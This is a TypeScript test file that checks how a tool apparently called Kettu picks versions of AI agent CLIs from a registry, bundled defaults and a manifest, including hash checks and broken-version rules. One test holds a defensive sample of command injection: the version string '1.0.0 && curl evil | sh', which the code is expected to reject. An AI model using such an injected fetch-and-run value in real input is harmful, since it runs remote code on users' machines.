import { describe, expect, it } from 'vitest'
import { buildCatalog, type AgentDefinition } from './catalog'
import type { HarnessRule } from './harness-manifest'
import {
  BUNDLED,
  bundledRelease,
  orderInstalls,
  parseBundled,
  staleInstalls,
  targetRelease,
} from './harness-versions'
import { followsRegistry, parseRegistry, type RegistryAgents } from './registry'

const HASH = 'ab'.repeat(32)

function listing(agents: unknown[]): RegistryAgents {
  const parsed = parseRegistry({ agents })
  if (!parsed) throw new Error('the listing did not parse')
  return parsed
}

const npm = (id: string, pkg: string, version: string) => ({
  id,
  version,
  distribution: { npx: { package: `${pkg}@${version}` } },
})

const GEMINI: AgentDefinition = {
  id: 'gemini',
  name: 'Gemini CLI',
  registryId: 'gemini',
  launch: { kind: 'package', package: '@google/gemini-cli', args: ['--acp'] },
  install: { hint: 'detect.hint.node', url: 'https://nodejs.org/en/download' },
}

const MINION: AgentDefinition = {
  id: 'minion',
  name: 'Minion Code',
  registryId: 'minion-code',
  launch: { kind: 'uvx', package: 'minion-code', args: ['acp'], minimum: '0.1.45' },
  install: { hint: 'detect.hint.uv', url: 'https://docs.astral.sh/uv/' },
}

const HARN: AgentDefinition = {
  id: 'harn',
  name: 'Harn',
  registryId: 'harn',
  launch: { kind: 'binary', command: 'harn', args: ['serve', 'acp'] },
  install: { hint: 'detect.hint.archive', url: 'https://harnlang.com' },
  installs: { archive: {} },
}

const archive = (version: string, sha256?: string) => ({
  id: 'harn',
  version,
  distribution: {
    binary: {
      'darwin-aarch64': {
        archive: `https://example.com/harn-${version}.tar.gz`,
        cmd: './harn',
        ...(sha256 ? { sha256 } : {}),
      },
    },
  },
})

const bundled = parseBundled({
  registry: {
    agents: [
      npm('gemini', '@google/gemini-cli', '0.66.0'),
      { id: 'minion-code', version: '0.1.44', distribution: { uvx: { package: 'minion-code' } } },
      archive('0.10.180', HASH),
    ],
  },
  kettu: { minion: { version: '0.1.45' } },
})

const target = (def: AgentDefinition, agents: unknown[] | null) =>
  targetRelease(def, agents && listing(agents), bundled, 'darwin', 'arm64')

describe('the version a harness that follows the registry moves to', () => {
  it('is the version the registry lists, a lower one too, else the bundled one', () => {
    expect(target(GEMINI, [npm('gemini', '@google/gemini-cli', '0.68.0')])).toEqual({
      kind: 'package',
      version: '0.68.0',
      source: 'registry',
    })
    // A registry that withdrew a version lists the one before it, which is followed.
    expect(target(GEMINI, [npm('gemini', '@google/gemini-cli', '0.60.0')])?.version).toBe('0.60.0')
    expect(target(GEMINI, null)).toMatchObject({ version: '0.66.0', source: 'bundled' })
    expect(target(GEMINI, [])).toMatchObject({ version: '0.66.0', source: 'bundled' })
  })

  it('stays inside the range the catalog accepts', () => {
    const listed = (version: string) => [
      { id: 'minion-code', version, distribution: { uvx: { package: `minion-code==${version}` } } },
    ]
    expect(target(MINION, listed('0.1.44'))).toMatchObject({ version: '0.1.45', source: 'bundled' })
    expect(target(MINION, listed('0.1.46'))).toMatchObject({
      version: '0.1.46',
      source: 'registry',
    })
    // Nothing in range is no version at all, never one below the minimum.
    const below = parseBundled({ registry: { agents: listed('0.1.44') } })
    expect(targetRelease(MINION, listing(listed('0.1.40')), below, 'darwin', 'arm64')).toBeNull()
  })

  it('refuses an entry that names another package, and takes the bundled one', () => {
    const swapped = [npm('gemini', '@someone-else/gemini-cli', '9.9.9')]
    expect(target(GEMINI, swapped)).toMatchObject({ version: '0.66.0', source: 'bundled' })
    const shell = [npm('gemini', '@google/gemini-cli', '1.0.0 && curl evil | sh')]
    expect(target(GEMINI, shell)).toMatchObject({ version: '0.66.0', source: 'bundled' })
  })

  it('refuses an archive whose hash is not a SHA-256, and takes the bundled one', () => {
    expect(target(HARN, [archive('0.10.201', 'not-a-hash')])).toMatchObject({
      version: '0.10.180',
      source: 'bundled',
    })
    expect(target(HARN, [archive('0.10.201', HASH)])).toMatchObject({
      version: '0.10.201',
      entry: { sha256: HASH },
      source: 'registry',
    })
    // Without any hash it is a version a first install may take, never an update.
    expect(target(HARN, [archive('0.10.202')])).not.toHaveProperty('entry.sha256')
  })

  it('leaves a vendor own package to its bundled version', () => {
    const sdk: AgentDefinition = {
      ...GEMINI,
      id: 'claude-code',
      registryId: 'claude-acp',
      launch: { kind: 'package', package: '@anthropic-ai/claude-agent-sdk', fromVendor: true },
    }
    const own = parseBundled({ kettu: { 'claude-code': { version: '0.3.314' } } })
    expect(targetRelease(sdk, listing([]), own, 'darwin', 'arm64')).toBeNull()
    expect(bundledRelease(sdk, own, 'darwin', 'arm64')?.version).toBe('0.3.314')
  })
})

const rule = (fields: Partial<HarnessRule>): HarnessRule => ({
  kettu: '*',
  broken: [],
  sha256: {},
  ...fields,
})

describe('the version the manifest recommends', () => {
  const SDK: AgentDefinition = {
    ...GEMINI,
    id: 'claude-code',
    registryId: 'claude-acp',
    launch: {
      kind: 'package',
      package: '@anthropic-ai/claude-agent-sdk',
      fromVendor: true,
      updates: '~0.3.314',
    },
  }
  const QODER: AgentDefinition = {
    ...GEMINI,
    id: 'qoder-cn',
    registryId: 'qoder-cn',
    launch: { kind: 'package', package: '@qodercn-ai/qoderclicn', fromVendor: true },
  }
  const MUSE: AgentDefinition = {
    ...HARN,
    id: 'muse',
    registryId: 'muse',
    launch: { kind: 'binary', command: 'muse', args: ['acp'] },
    installs: { archive: { fromVendor: true } },
  }
  const own = parseBundled({
    kettu: {
      'claude-code': { version: '0.3.314' },
      'qoder-cn': { version: '1.1.90' },
      muse: {
        version: '1.4.14-R7309.1',
        archives: {
          'darwin-aarch64': {
            url: 'https://example.com/muse/?version=1.4.14-R7309.1&file=muse-aarch64-macos',
            sha256: HASH,
            cmd: 'muse',
            args: ['acp'],
            bare: true,
          },
        },
      },
    },
  })
  const vendor = (def: AgentDefinition, fields: Partial<HarnessRule>) =>
    targetRelease(def, null, own, 'darwin', 'arm64', rule(fields))

  it('gives a vendor own package its target inside the range the catalog accepts', () => {
    expect(vendor(SDK, { recommended: '0.3.326' })).toEqual({
      kind: 'package',
      version: '0.3.326',
      source: 'manifest',
    })
    // A rollback inside the update range is followed too.
    expect(vendor(SDK, { recommended: '0.3.314' })?.version).toBe('0.3.314')
    expect(vendor(SDK, { recommended: '0.4.0' })).toBeNull()
    expect(vendor(SDK, { recommended: '0.3.330', supported: '<0.3.330' })).toBeNull()
    expect(vendor(QODER, { recommended: '1.1.95' })?.version).toBe('1.1.95')
    // Without an update range, the bundled version is the oldest the catalog accepts.
    expect(vendor(QODER, { recommended: '1.1.80' })).toBeNull()
    expect(vendor(QODER, { broken: ['1.1.90'] })).toBeNull()
  })

  it("moves a vendor's archive only with the manifest's hash for this platform", () => {
    const hash = 'cd'.repeat(32)
    expect(
      vendor(MUSE, { recommended: '1.4.23-R8977.1', sha256: { 'darwin-aarch64': hash } }),
    ).toMatchObject({
      kind: 'archive',
      version: '1.4.23-R8977.1',
      source: 'manifest',
      entry: {
        url: 'https://example.com/muse/?version=1.4.23-R8977.1&file=muse-aarch64-macos',
        sha256: hash,
      },
    })
    expect(vendor(MUSE, { recommended: '1.4.23-R8977.1' })).toBeNull()
    expect(
      vendor(MUSE, { recommended: '1.4.23-R8977.1', sha256: { 'linux-x86_64': hash } }),
    ).toBeNull()
    expect(vendor(MUSE, { recommended: '1.4.14-R7309.1' })).toMatchObject({
      entry: { sha256: HASH },
      source: 'manifest',
    })
  })

  it('holds a harness that follows the registry at its version, and skips a broken one', () => {
    const live = [npm('gemini', '@google/gemini-cli', '0.68.0')]
    const held = targetRelease(GEMINI, listing(live), bundled, 'darwin', 'arm64', rule({}))
    expect(held).toMatchObject({ version: '0.68.0', source: 'registry' })
    const pinned = rule({ recommended: '0.67.0' })
    expect(targetRelease(GEMINI, listing(live), bundled, 'darwin', 'arm64', pinned)).toEqual({
      kind: 'package',
      version: '0.67.0',
      source: 'manifest',
    })
    const broken = rule({ broken: ['>=0.68.0'] })
    expect(targetRelease(GEMINI, listing(live), bundled, 'darwin', 'arm64', broken)).toMatchObject({
      version: '0.66.0',
      source: 'bundled',
    })
    // Nothing that works is left: the version the registry lists still runs.
    const all = rule({ broken: ['*'] })
    expect(targetRelease(GEMINI, listing(live), bundled, 'darwin', 'arm64', all)?.version).toBe(
      '0.68.0',
    )
    // Below the catalog's own minimum, the recommendation is not taken.
    const old = rule({ recommended: '0.1.44' })
    expect(targetRelease(MINION, null, bundled, 'darwin', 'arm64', old)).toMatchObject({
      version: '0.1.45',
      source: 'bundled',
    })
  })

  it("takes an archive's address only from a listing at the version it recommends", () => {
    const live = listing([archive('0.10.201', HASH)])
    const at = (recommended: string) =>
      targetRelease(HARN, live, bundled, 'darwin', 'arm64', rule({ recommended }))
    expect(at('0.10.201')).toMatchObject({ source: 'manifest', entry: { sha256: HASH } })
    expect(at('0.10.180')).toMatchObject({ source: 'manifest', version: '0.10.180' })
    expect(at('0.10.190')).toMatchObject({ source: 'registry', version: '0.10.201' })
  })
})

describe('the installs a start may run', () => {
  const install = (version: string, installedAt: number) => ({ version, installedAt })

  it('leaves out a version the manifest refuses, unless it is the one wanted', () => {
    const installs = [install('1.0.0', 1), install('1.1.0', 2), install('1.2.0', 3)]
    const refused = (version: string) => version === '1.1.0' || version === '1.2.0'
    const wanted = orderInstalls(installs, { wanted: '1.0.0', ran: '1.1.0', refused })
    expect(wanted.runs.map((i) => i.version)).toEqual(['1.0.0'])
    const floor = orderInstalls(installs, { wanted: '1.1.0', floor: true, refused })
    expect(floor.runs.map((i) => i.version)).toEqual(['1.1.0'])
    expect(floor.below?.version).toBe('1.0.0')
  })
})

describe('the versions this build bundles', () => {
  it('give every harness Kettu installs a version that passes the checks', () => {
    for (const def of buildCatalog(null)) {
      const { launch } = def
      const installs =
        launch.kind === 'package' ||
        launch.kind === 'uvx' ||
        (launch.kind === 'binary' && !!def.installs?.archive)
      if (!installs) continue
      const found = ['darwin-arm64', 'linux-x64', 'win32-x64'].flatMap((target) => {
        const [platform, arch] = target.split('-') as ['darwin' | 'linux' | 'win32', string]
        const release = bundledRelease(def, BUNDLED, platform, arch)
        return release ? [release] : []
      })
      expect(found.length, `${def.id} has no bundled version`).toBeGreaterThan(0)
      expect(followsRegistry(def) || BUNDLED.kettu.has(def.id), def.id).toBe(true)
    }
  })
})

describe('the installs kept once a version runs', () => {
  const install = (version: string, installedAt: number) => ({
    version,
    installedAt,
    dir: `/kettu/harnesses/gemini/${version}-${installedAt}`,
  })

  it('keeps the one before it to fall back to and any installed after it', () => {
    const older = install('0.60.0', 1)
    const before = install('0.66.0', 2)
    const again = install('0.68.0', 3)
    const current = install('0.68.0', 4)
    const later = install('0.70.0', 5)
    expect(staleInstalls([older, before, again, current, later], current)).toEqual([older, again])
  })
})
